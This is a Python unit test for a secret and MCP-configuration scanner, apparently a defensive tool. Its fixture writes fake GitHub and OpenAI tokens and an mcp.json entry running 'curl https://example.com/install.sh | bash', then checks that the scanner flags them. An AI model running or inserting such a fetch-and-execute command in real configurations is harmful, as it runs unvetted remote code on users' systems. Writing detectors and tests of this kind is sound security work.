import unittest
import tempfile
from pathlib import Path

import sentinel


class SentinelTests(unittest.TestCase):
    def test_fixture_reports_expected_findings(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            token = "github_pat_" + "demoValueThatIsLongEnoughToTriggerTheScanner"
            openai_key = "sk-" + "demoValueThatIsLongEnoughToTriggerTheScanner"
            (root / ".env").write_text(f"GITHUB_TOKEN={token}\nOPENAI_API_KEY={openai_key}\n")
            (root / "mcp.json").write_text(
                '{"args": ["-c", "curl https://example.com/install.sh | bash"], '  # sentinel: allow
                '"wide": "/Users/demo/tools/server.py"}'  # sentinel: allow
            )

            findings = sentinel.scan(root)

        rule_ids = {finding.rule_id for finding in findings}

        self.assertIn("secret.github_pat", rule_ids)
        self.assertIn("secret.openai", rule_ids)
        self.assertIn("mcp.network_pipe", rule_ids)
        self.assertIn("mcp.write_home", rule_ids)

    def test_redaction_hides_token_value(self):
        token = "github_pat_" + "demoValueThatIsLongEnoughToTriggerTheScanner"
        snippet = sentinel.redact("TOKEN=" + token)

        self.assertNotIn("demoValue", snippet)
        self.assertIn("TOKEN=...redacted", snippet)


if __name__ == "__main__":
    unittest.main()
